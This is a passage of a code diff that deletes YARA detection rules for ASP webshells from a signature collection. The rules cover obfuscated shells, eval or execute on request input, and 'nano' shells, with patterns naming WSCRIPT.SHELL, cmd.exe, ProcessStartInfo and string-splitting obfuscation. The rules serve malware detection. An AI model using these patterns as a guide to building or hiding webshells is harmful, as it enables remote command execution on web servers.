-        hash = "83642a926291a499916e8c915dacadd0d5a8b91f"
-        hash = "5417fad68a6f7320d227f558bf64657fe3aa9153"
-        hash = "97d9f6c411f54b56056a145654cd00abca2ff871"
-        hash = "fc44fd7475ee6c0758ace2b17dd41ed7ea75cc73"
-
-        id = "a1310e22-f485-5f06-8f1a-4cf9ae8413a1"
-    strings:
-        $sus1 = "password" fullword wide ascii
-        $sus2 = "pwd" fullword wide ascii
-        $sus3 = "<asp:TextBox" fullword nocase wide ascii
-        $sus4 = "\"upload\"" wide ascii
-        $sus5 = "\"Upload\"" wide ascii
-        $sus6 = "gif89" wide ascii
-        $sus7 = "\"&\"" wide ascii
-        $sus8 = "authkey" fullword wide ascii
-        $sus9 = "AUTHKEY" fullword wide ascii
-        $sus10= "test.asp" fullword wide ascii
-        $sus11= "cmd.asp" fullword wide ascii
-        $sus12= ".Write(Request." wide ascii
-        $sus13= "<textarea " wide ascii
-        $sus14= "\"unsafe" fullword wide ascii
-        $sus15= "'unsafe" fullword wide ascii
-        $sus16= "Army" fullword wide ascii
-
-        //strings from private rule capa_asp
-        $tagasp_short1 = /<%[^"]/ wide ascii
-        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
-        $tagasp_short2 = "%>" wide ascii
-
-        // classids for scripting host etc
-        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
-        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
-        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
-        $tagasp_long10 = "<%@ " wide ascii
-        // <% eval
-        $tagasp_long11 = /<% \w/ nocase wide ascii
-        $tagasp_long12 = "<%ex" nocase wide ascii
-        $tagasp_long13 = "<%ev" nocase wide ascii
-
-        // <%@ LANGUAGE = VBScript.encode%>
-        // <%@ Language = "JScript" %>
-
-        // <%@ WebHandler Language="C#" class="Handler" %>
-        // <%@ WebService Language="C#" Class="Service" %>
-
-        // <%@Page Language="Jscript"%>
-        // <%@ Page Language = Jscript %>
-        // <%@PAGE LANGUAGE=JSCRIPT%>
-        // <%@ Page Language="Jscript" validateRequest="false" %>
-        // <%@ Page Language = Jscript %>
-        // <%@ Page Language="C#" %>
-        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
-        // <script runat="server" language="JScript">
-        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
-        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
-        // <msxsl:script language="JScript" ...
-        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
-
-        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
-        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
-
-        // avoid hitting php
-        $php1 = "<?php"
-        $php2 = "<?="
-
-        // avoid hitting jsp
-        $jsp1 = "=\"java." wide ascii
-        $jsp2 = "=\"javax." wide ascii
-        $jsp3 = "java.lang." wide ascii
-        $jsp4 = "public" fullword wide ascii
-        $jsp5 = "throws" fullword wide ascii
-        $jsp6 = "getValue" fullword wide ascii
-        $jsp7 = "getBytes" fullword wide ascii
-
-        $perl1 = "PerlScript" fullword
-
-
-        //strings from private rule capa_asp_input
-        // Request.BinaryRead
-        // Request.Form
-        $asp_input1 = "request" fullword nocase wide ascii
-        $asp_input2 = "Page_Load" fullword nocase wide ascii
-        // base64 of Request.Form(
-        $asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
-        $asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
-        $asp_xml_method1 = "GET" fullword wide ascii
-        $asp_xml_method2 = "POST" fullword wide ascii
-        $asp_xml_method3 = "HEAD" fullword wide ascii
-        // dynamic form
-        $asp_form1 = "<form " wide ascii
-        $asp_form2 = "<Form " wide ascii
-        $asp_form3 = "<FORM " wide ascii
-        $asp_asp   = "<asp:" wide ascii
-        $asp_text1 = ".text" wide ascii
-        $asp_text2 = ".Text" wide ascii
-
-        //strings from private rule capa_asp_write_file
-        // $asp_write1 = "ADODB.Stream" wide ascii # just a string, can be easily obfuscated
-        $asp_always_write1 = /\.write/ nocase wide ascii
-        $asp_always_write2 = /\.swrite/ nocase wide ascii
-        //$asp_write_way_one1 = /\.open\b/ nocase wide ascii
-        $asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
-        $asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
-        $asp_cr_write1 = "CreateObject(" nocase wide ascii
-        $asp_cr_write2 = "CreateObject (" nocase wide ascii
-        $asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
-        $asp_streamwriter2 = "filestream" fullword nocase wide ascii
-
-    condition:
-        (
-        (
-            any of ( $tagasp_long* ) or
-            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
-            any of ( $tagasp_classid* ) or
-            (
-                $tagasp_short1 and
-                $tagasp_short2 in ( filesize-100..filesize )
-            ) or (
-                $tagasp_short2 and (
-                    $tagasp_short1 in ( 0..1000 ) or
-                    $tagasp_short1 in ( filesize-1000..filesize )
-                )
-            )
-        ) and not (
-            (
-                any of ( $perl* ) or
-                $php1 at 0 or
-                $php2 at 0
-            ) or (
-                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
-                )
-        )
-        )
-        and (
-            any of ( $asp_input* ) or
-        (
-            $asp_xml_http and
-            any of ( $asp_xml_method* )
-        ) or
-        (
-            any of ( $asp_form* ) and
-            any of ( $asp_text* ) and
-            $asp_asp
-        )
-        )
-        and (
-        any of ( $asp_always_write* ) and
-        (
-            any of ( $asp_write_way_one* ) and
-            any of ( $asp_cr_write* )
-        ) or (
-            any of ( $asp_streamwriter* )
-        )
-        )
-        and
-        ( filesize < 400 or
-        ( filesize < 6000 and 1 of ( $sus* ) ) )
-}
-
-rule WEBSHELL_ASP_OBFUSC
-{
-    meta:
-        description = "ASP webshell obfuscated"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/01/12"
-        modified = "2023-07-05"
-        hash = "ad597eee256de51ffb36518cd5f0f4aa0f254f27517d28fb7543ae313b15e112"
-        hash = "e0d21fdc16e0010b88d0197ebf619faa4aeca65243f545c18e10859469c1805a"
-        hash = "54a5620d4ea42e41beac08d8b1240b642dd6fd7c"
-        hash = "fc44fd7475ee6c0758ace2b17dd41ed7ea75cc73"
-        hash = "be2fedc38fc0c3d1f925310d5156ccf3d80f1432"
-        hash = "3175ee00fc66921ebec2e7ece8aa3296d4275cb5"
-        hash = "d6b96d844ac395358ee38d4524105d331af42ede"
-        hash = "cafc4ede15270ab3f53f007c66e82627a39f4d0f"
-
-        id = "3960b692-9f6f-52c5-b881-6f9e1b3ac555"
-    strings:
-        $asp_obf1 = "/*-/*-*/" wide ascii
-        $asp_obf2 = "u\"+\"n\"+\"s" wide ascii
-        $asp_obf3 = "\"e\"+\"v" wide ascii
-        $asp_obf4 = "a\"+\"l\"" wide ascii
-        $asp_obf5 = "\"+\"(\"+\"" wide ascii
-        $asp_obf6 = "q\"+\"u\"" wide ascii
-        $asp_obf7 = "\"u\"+\"e" wide ascii
-        $asp_obf8 = "/*//*/" wide ascii
-
-        //strings from private rule capa_asp
-        $tagasp_short1 = /<%[^"]/ wide ascii
-        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
-        $tagasp_short2 = "%>" wide ascii
-
-        // classids for scripting host etc
-        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
-        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
-        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
-        $tagasp_long10 = "<%@ " wide ascii
-        // <% eval
-        $tagasp_long11 = /<% \w/ nocase wide ascii
-        $tagasp_long12 = "<%ex" nocase wide ascii
-        $tagasp_long13 = "<%ev" nocase wide ascii
-
-        // <%@ LANGUAGE = VBScript.encode%>
-        // <%@ Language = "JScript" %>
-
-        // <%@ WebHandler Language="C#" class="Handler" %>
-        // <%@ WebService Language="C#" Class="Service" %>
-
-        // <%@Page Language="Jscript"%>
-        // <%@ Page Language = Jscript %>
-        // <%@PAGE LANGUAGE=JSCRIPT%>
-        // <%@ Page Language="Jscript" validateRequest="false" %>
-        // <%@ Page Language = Jscript %>
-        // <%@ Page Language="C#" %>
-        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
-        // <script runat="server" language="JScript">
-        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
-        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
-        // <msxsl:script language="JScript" ...
-        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
-
-        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
-        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
-
-        // avoid hitting php
-        $php1 = "<?php"
-        $php2 = "<?="
-
-        // avoid hitting jsp
-        $jsp1 = "=\"java." wide ascii
-        $jsp2 = "=\"javax." wide ascii
-        $jsp3 = "java.lang." wide ascii
-        $jsp4 = "public" fullword wide ascii
-        $jsp5 = "throws" fullword wide ascii
-        $jsp6 = "getValue" fullword wide ascii
-        $jsp7 = "getBytes" fullword wide ascii
-
-        $perl1 = "PerlScript" fullword
-
-
-        //strings from private rule capa_asp_payload
-        $asp_payload0  = "eval_r" fullword nocase wide ascii
-        $asp_payload1  = /\beval\s/ nocase wide ascii
-        $asp_payload2  = /\beval\(/ nocase wide ascii
-        $asp_payload3  = /\beval\"\"/ nocase wide ascii
-        // var Fla = {'E':eval};  Fla.E(code)
-        $asp_payload4  = /:\s{0,10}eval\b/ nocase wide ascii
-        $asp_payload8  = /\bexecute\s?\(/ nocase wide ascii
-        $asp_payload9  = /\bexecute\s[\w"]/ nocase wide ascii
-        $asp_payload11 = "WSCRIPT.SHELL" fullword nocase wide ascii
-        $asp_payload13 = "ExecuteGlobal" fullword nocase wide ascii
-        $asp_payload14 = "ExecuteStatement" fullword nocase wide ascii
-        $asp_payload15 = "ExecuteStatement" fullword nocase wide ascii
-        $asp_multi_payload_one1 = "CreateObject" nocase fullword wide ascii
-        $asp_multi_payload_one2 = "addcode" fullword wide ascii
-        $asp_multi_payload_one3 = /\.run\b/ wide ascii
-        $asp_multi_payload_two1 = "CreateInstanceFromVirtualPath" fullword wide ascii
-        $asp_multi_payload_two2 = "ProcessRequest" fullword wide ascii
-        $asp_multi_payload_two3 = "BuildManager" fullword wide ascii
-        $asp_multi_payload_three1 = "System.Diagnostics" wide ascii
-        $asp_multi_payload_three2 = "Process" fullword wide ascii
-        $asp_multi_payload_three3 = ".Start" wide ascii
-        // this is about "MSXML2.DOMDocument" but since that's easily obfuscated, lets not search for it
-        $asp_multi_payload_four1 = "CreateObject" fullword nocase wide ascii
-        $asp_multi_payload_four2 = "TransformNode" fullword nocase wide ascii
-        $asp_multi_payload_four3 = "loadxml" fullword nocase wide ascii
-
-        // execute cmd.exe /c with arguments using ProcessStartInfo
-        $asp_multi_payload_five1 = "ProcessStartInfo" fullword nocase wide ascii
-        $asp_multi_payload_five2 = ".Start" nocase wide ascii
-        $asp_multi_payload_five3 = ".Filename" nocase wide ascii
-        $asp_multi_payload_five4 = ".Arguments" nocase wide ascii
-
-
-        //strings from private rule capa_asp_write_file
-        // $asp_write1 = "ADODB.Stream" wide ascii # just a string, can be easily obfuscated
-        $asp_always_write1 = /\.write/ nocase wide ascii
-        $asp_always_write2 = /\.swrite/ nocase wide ascii
-        //$asp_write_way_one1 = /\.open\b/ nocase wide ascii
-        $asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
-        $asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
-        $asp_cr_write1 = "CreateObject(" nocase wide ascii
-        $asp_cr_write2 = "CreateObject (" nocase wide ascii
-        $asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
-        $asp_streamwriter2 = "filestream" fullword nocase wide ascii
-
-        //strings from private rule capa_asp_obfuscation_multi
-        // many Chr or few and a loop????
-        //$loop1 = "For "
-        //$o1 = "chr(" nocase wide ascii
-        //$o2 = "chr (" nocase wide ascii
-        // not excactly a string function but also often used in obfuscation
-        $o4 = "\\x8" wide ascii
-        $o5 = "\\x9" wide ascii
-        // just picking some random numbers because they should appear often enough in a long obfuscated blob and it's faster than a regex
-        $o6 = "\\61" wide ascii
-        $o7 = "\\44" wide ascii
-        $o8 = "\\112" wide ascii
-        $o9 = "\\120" wide ascii
-        //$o10 = " & \"" wide ascii
-        //$o11 = " += \"" wide ascii
-        // used for e.g. "scr"&"ipt"
-
-        $m_multi_one1 = "Replace(" wide ascii
-        $m_multi_one2 = "Len(" wide ascii
-        $m_multi_one3 = "Mid(" wide ascii
-        $m_multi_one4 = "mid(" wide ascii
-        $m_multi_one5 = ".ToString(" wide ascii
-
-        /*
-        $m_multi_one5 = "InStr(" wide ascii
-        $m_multi_one6 = "Function" wide ascii
-
-        $m_multi_two1 = "for each" wide ascii
-        $m_multi_two2 = "split(" wide ascii
-        $m_multi_two3 = " & chr(" wide ascii
-        $m_multi_two4 = " & Chr(" wide ascii
-        $m_multi_two5 = " & Chr (" wide ascii
-
-        $m_multi_three1 = "foreach" fullword wide ascii
-        $m_multi_three2 = "(char" wide ascii
-
-        $m_multi_four1 = "FromBase64String(" wide ascii
-        $m_multi_four2 = ".Replace(" wide ascii
-        $m_multi_five1 = "String.Join(\"\"," wide ascii
-        $m_multi_five2 = ".Trim(" wide ascii
-        $m_any1 = " & \"2" wide ascii
-        $m_any2 = " += \"2" wide ascii
-        */
-
-        $m_fp1 = "Author: Andre Teixeira - andret@microsoft.com" /* FPs with 0227f4c366c07c45628b02bae6b4ad01 */
-        $m_fp2 = "DataBinder.Eval(Container.DataItem" ascii wide
-
-
-        //strings from private rule capa_asp_obfuscation_obviously
-        $oo1 = /\w\"&\"\w/ wide ascii
-        $oo2 = "*/\").Replace(\"/*" wide ascii
-
-    condition:
-        filesize < 100KB and (
-        (
-            any of ( $tagasp_long* ) or
-            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
-            any of ( $tagasp_classid* ) or
-            (
-                $tagasp_short1 and
-                $tagasp_short2 in ( filesize-100..filesize )
-            ) or (
-                $tagasp_short2 and (
-                    $tagasp_short1 in ( 0..1000 ) or
-                    $tagasp_short1 in ( filesize-1000..filesize )
-                )
-            )
-        ) and not (
-            (
-                any of ( $perl* ) or
-                $php1 at 0 or
-                $php2 at 0
-            ) or (
-                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
-                )
-        )
-        )
-        and
-        ( ( (
-            any of ( $asp_payload* ) or
-        all of ( $asp_multi_payload_one* ) or
-        all of ( $asp_multi_payload_two* ) or
-        all of ( $asp_multi_payload_three* ) or
-        all of ( $asp_multi_payload_four* ) or
-        all of ( $asp_multi_payload_five* )
-        )
-        or (
-        any of ( $asp_always_write* ) and
-        (
-            any of ( $asp_write_way_one* ) and
-            any of ( $asp_cr_write* )
-        ) or (
-            any of ( $asp_streamwriter* )
-        )
-        )
-        ) and
-        ( (
-        (
-            filesize < 100KB and
-            (
-                //( #o1+#o2 ) > 50 or
-                ( #o4+#o5+#o6+#o7+#o8+#o9 ) > 20
-            )
-        ) or (
-            filesize < 5KB and
-            (
-                //( #o1+#o2 ) > 10 or
-                ( #o4+#o5+#o6+#o7+#o8+#o9 ) > 5 or
-                (
-                    //( #o1+#o2 ) > 1 and
-                    ( #m_multi_one1 + #m_multi_one2 + #m_multi_one3 + #m_multi_one4 + #m_multi_one5 ) > 3
-                )
-
-            )
-        ) or (
-            filesize < 700 and
-            (
-                //( #o1+#o2 ) > 1 or
-                ( #o4+#o5+#o6+#o7+#o8+#o9 ) > 3 or
-                ( #m_multi_one1 + #m_multi_one2 + #m_multi_one3 + #m_multi_one4 + #m_multi_one5 ) > 2
-            )
-        )
-        )
-        or any of ( $asp_obf* ) ) or (
-        (
-            filesize < 100KB and
-            (
-                ( #oo1 ) > 2 or
-                $oo2
-            )
-        ) or (
-            filesize < 25KB and
-            (
-                ( #oo1 ) > 1
-            )
-        ) or (
-            filesize < 1KB and
-            (
-                ( #oo1 ) > 0
-            )
-        )
-        )
-        )
-        and not any of ( $m_fp* )
-}
-
-rule WEBSHELL_ASP_Generic_Eval_On_Input
-{
-    meta:
-        description = "Generic ASP webshell which uses any eval/exec function directly on user input"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/01/07"
-        modified = "2023-04-05"
-        hash = "d6b96d844ac395358ee38d4524105d331af42ede"
-        hash = "9be2088d5c3bfad9e8dfa2d7d7ba7834030c7407"
-        hash = "a1df4cfb978567c4d1c353e988915c25c19a0e4a"
-        hash = "069ea990d32fc980939fffdf1aed77384bf7806bc57c0a7faaff33bd1a3447f6"
-
-        id = "0904cefb-6e0f-5e5f-9986-cf83d409ce46"
-    strings:
-        $payload_and_input0 = /\beval_r\s{0,20}\(Request\(/ nocase wide ascii
-        $payload_and_input1 = /\beval[\s\(]{1,20}request[.\(\[]/ nocase wide ascii
-        $payload_and_input2 = /\bexecute[\s\(]{1,20}request\(/ nocase wide ascii
-        $payload_and_input4 = /\bExecuteGlobal\s{1,20}request\(/ nocase wide ascii
-
-        //strings from private rule capa_asp
-        $tagasp_short1 = /<%[^"]/ wide ascii
-        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
-        $tagasp_short2 = "%>" wide ascii
-
-        // classids for scripting host etc
-        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
-        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
-        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
-        $tagasp_long10 = "<%@ " wide ascii
-        // <% eval
-        $tagasp_long11 = /<% \w/ nocase wide ascii
-        $tagasp_long12 = "<%ex" nocase wide ascii
-        $tagasp_long13 = "<%ev" nocase wide ascii
-
-        // <%@ LANGUAGE = VBScript.encode%>
-        // <%@ Language = "JScript" %>
-
-        // <%@ WebHandler Language="C#" class="Handler" %>
-        // <%@ WebService Language="C#" Class="Service" %>
-
-        // <%@Page Language="Jscript"%>
-        // <%@ Page Language = Jscript %>
-        // <%@PAGE LANGUAGE=JSCRIPT%>
-        // <%@ Page Language="Jscript" validateRequest="false" %>
-        // <%@ Page Language = Jscript %>
-        // <%@ Page Language="C#" %>
-        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
-        // <script runat="server" language="JScript">
-        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
-        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
-        // <msxsl:script language="JScript" ...
-        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
-
-        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
-        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
-
-        // avoid hitting php
-        $php1 = "<?php"
-        $php2 = "<?="
-
-        // avoid hitting jsp
-        $jsp1 = "=\"java." wide ascii
-        $jsp2 = "=\"javax." wide ascii
-        $jsp3 = "java.lang." wide ascii
-        $jsp4 = "public" fullword wide ascii
-        $jsp5 = "throws" fullword wide ascii
-        $jsp6 = "getValue" fullword wide ascii
-        $jsp7 = "getBytes" fullword wide ascii
-
-        $perl1 = "PerlScript" fullword
-
-
-    condition:
-        ( filesize < 1100KB and (
-        (
-            any of ( $tagasp_long* ) or
-            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
-            any of ( $tagasp_classid* ) or
-            (
-                $tagasp_short1 and
-                $tagasp_short2 in ( filesize-100..filesize )
-            ) or (
-                $tagasp_short2 and (
-                    $tagasp_short1 in ( 0..1000 ) or
-                    $tagasp_short1 in ( filesize-1000..filesize )
-                )
-            )
-        ) and not (
-            (
-                any of ( $perl* ) or
-                $php1 at 0 or
-                $php2 at 0
-            ) or (
-                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
-                )
-        )
-        )
-        and any of ( $payload_and_input* ) ) or
-        ( filesize < 100 and any of ( $payload_and_input* ) )
-}
-
-rule WEBSHELL_ASP_Nano
-{
-    meta:
-        description = "Generic ASP webshell which uses any eval/exec function"
-        license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-        author = "Arnim Rupp (https://github.com/ruppde)"
-        reference = "Internal Research"
-        score = 75
-        date = "2021/01/13"
-        modified = "2023-04-05"
-        hash = "3b7910a499c603715b083ddb6f881c1a0a3a924d"
-        hash = "990e3f129b8ba409a819705276f8fa845b95dad0"
-        hash = "22345e956bce23304f5e8e356c423cee60b0912c"
-        hash = "c84a6098fbd89bd085526b220d0a3f9ab505bcba"
-        hash = "b977c0ad20dc738b5dacda51ec8da718301a75d7"
-        hash = "c69df00b57fd127c7d4e0e2a40d2f6c3056e0af8bfb1925938060b7e0d8c630f"
-        hash = "f3b39a5da1cdde9acde077208e8e5b27feb973514dab7f262c7c6b2f8f11eaa7"
-        hash = "0e9d92807d990144c637d8b081a6a90a74f15c7337522874cf6317092ea2d7c1"
-        hash = "ebbc485e778f8e559ef9c66f55bb01dc4f5dcce9c31ccdd150e2c702c4b5d9e1"
-        hash = "44b4068bfbbb8961e16bae238ad23d181ac9c8e4fcb4b09a66bbcd934d2d39ee"
-        hash = "c5a4e188780b5513f34824904d56bf6e364979af6782417ccc5e5a8a70b4a95a"
-        hash = "41a3cc668517ec207c990078bccfc877e239b12a7ff2abe55ff68352f76e819c"
-        hash = "2faad5944142395794e5e6b90a34a6204412161f45e130aeb9c00eff764f65fc"
-        hash = "d0c5e641120b8ea70a363529843d9f393074c54af87913b3ab635189fb0c84cb"
-        hash = "28cfcfe28419a399c606bf96505bc68d6fe05624dba18306993f9fe0d398fbe1"
-
-        id = "5f2f24c2-159d-51e1-80d9-11eeb77e8760"
-    strings:
-        $susasp1  = "/*-/*-*/"
-        $susasp2  = "(\"%1"
-        $susasp3  = /[Cc]hr\([Ss]tr\(/
-        $susasp4  = "cmd.exe"
-        $susasp5  = "cmd /c"
-        $susasp7  = "FromBase64String"
-        // Request and request in b64:
-        $susasp8  = "UmVxdWVzdC"
-        $susasp9  = "cmVxdWVzdA"
-        $susasp10 = "/*//*/"
-        $susasp11 = "(\"/*/\""
-        $susasp12 = "eval(eval("
-        $fp1      = "eval a"
-        $fp2      = "'Eval'"
-        $fp3      = "Eval(\""
-
-        //strings from private rule capa_asp
-        $tagasp_short1 = /<%[^"]/ wide ascii
-        // also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
-        $tagasp_short2 = "%>" wide ascii
-
-        // classids for scripting host etc
-        $tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
-        $tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
-        $tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
-        $tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
-        $tagasp_long10 = "<%@ " wide ascii
-        // <% eval
-        $tagasp_long11 = /<% \w/ nocase wide ascii
-        $tagasp_long12 = "<%ex" nocase wide ascii
-        $tagasp_long13 = "<%ev" nocase wide ascii
-
-        // <%@ LANGUAGE = VBScript.encode%>
-        // <%@ Language = "JScript" %>
-
-        // <%@ WebHandler Language="C#" class="Handler" %>
-        // <%@ WebService Language="C#" Class="Service" %>
-
-        // <%@Page Language="Jscript"%>
-        // <%@ Page Language = Jscript %>
-        // <%@PAGE LANGUAGE=JSCRIPT%>
-        // <%@ Page Language="Jscript" validateRequest="false" %>
-        // <%@ Page Language = Jscript %>
-        // <%@ Page Language="C#" %>
-        // <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
-        // <script runat="server" language="JScript">
-        // <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
-        // <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
-        // <msxsl:script language="JScript" ...
-        $tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
-
-        $tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
-        $tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
-
-        // avoid hitting php
-        $php1 = "<?php"
-        $php2 = "<?="
-
-        // avoid hitting jsp
-        $jsp1 = "=\"java." wide ascii
-        $jsp2 = "=\"javax." wide ascii
-        $jsp3 = "java.lang." wide ascii
-        $jsp4 = "public" fullword wide ascii
-        $jsp5 = "throws" fullword wide ascii
-        $jsp6 = "getValue" fullword wide ascii
-        $jsp7 = "getBytes" fullword wide ascii
-
-        $perl1 = "PerlScript" fullword
-
-
-        //strings from private rule capa_asp_payload
-        $asp_payload0  = "eval_r" fullword nocase wide ascii
-        $asp_payload1  = /\beval\s/ nocase wide ascii
-        $asp_payload2  = /\beval\(/ nocase wide ascii
-        $asp_payload3  = /\beval\"\"/ nocase wide ascii
-        // var Fla = {'E':eval};  Fla.E(code)
-        $asp_payload4  = /:\s{0,10}eval\b/ nocase wide ascii
-        $asp_payload8  = /\bexecute\s?\(/ nocase wide ascii
-        $asp_payload9  = /\bexecute\s[\w"]/ nocase wide ascii
-        $asp_payload11 = "WSCRIPT.SHELL" fullword nocase wide ascii
-        $asp_payload13 = "ExecuteGlobal" fullword nocase wide ascii
-        $asp_payload14 = "ExecuteStatement" fullword nocase wide ascii
-        $asp_payload15 = "ExecuteStatement" fullword nocase wide ascii
-        $asp_multi_payload_one1 = "CreateObject" nocase fullword wide ascii
-        $asp_multi_payload_one2 = "addcode" fullword wide ascii
-        $asp_multi_payload_one3 = /\.run\b/ wide ascii
-        $asp_multi_payload_two1 = "CreateInstanceFromVirtualPath" fullword wide ascii
-        $asp_multi_payload_two2 = "ProcessRequest" fullword wide ascii
-        $asp_multi_payload_two3 = "BuildManager" fullword wide ascii
-        $asp_multi_payload_three1 = "System.Diagnostics" wide ascii
-        $asp_multi_payload_three2 = "Process" fullword wide ascii
-        $asp_multi_payload_three3 = ".Start" wide ascii
-        // this is about "MSXML2.DOMDocument" but since that's easily obfuscated, lets not search for it
-        $asp_multi_payload_four1 = "CreateObject" fullword nocase wide ascii
-        $asp_multi_payload_four2 = "TransformNode" fullword nocase wide ascii
-        $asp_multi_payload_four3 = "loadxml" fullword nocase wide ascii
-
-        // execute cmd.exe /c with arguments using ProcessStartInfo
-        $asp_multi_payload_five1 = "ProcessStartInfo" fullword nocase wide ascii
-        $asp_multi_payload_five2 = ".Start" nocase wide ascii
-        $asp_multi_payload_five3 = ".Filename" nocase wide ascii
-        $asp_multi_payload_five4 = ".Arguments" nocase wide ascii
-
-
-        //strings from private rule capa_asp_write_file
-        // $asp_write1 = "ADODB.Stream" wide ascii # just a string, can be easily obfuscated
-        $asp_always_write1 = /\.write/ nocase wide ascii
-        $asp_always_write2 = /\.swrite/ nocase wide ascii
-        //$asp_write_way_one1 = /\.open\b/ nocase wide ascii
-        $asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
-        $asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
-        $asp_cr_write1 = "CreateObject(" nocase wide ascii
-        $asp_cr_write2 = "CreateObject (" nocase wide ascii
-        $asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
-        $asp_streamwriter2 = "filestream" fullword nocase wide ascii
-
-    condition:
-        (
-        (
-            any of ( $tagasp_long* ) or
-            // TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
-            any of ( $tagasp_classid* ) or
-            (
-                $tagasp_short1 and
-                $tagasp_short2 in ( filesize-100..filesize )
-            ) or (
-                $tagasp_short2 and (
-                    $tagasp_short1 in ( 0..1000 ) or
-                    $tagasp_short1 in ( filesize-1000..filesize )
-                )
-            )
-        ) and not (
-            (
-                any of ( $perl* ) or
-                $php1 at 0 or
-                $php2 at 0
-            ) or (
-                ( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
-                )
-        )
-        )
-        and
-        ( (
-            any of ( $asp_payload* ) or
-        all of ( $asp_multi_payload_one* ) or
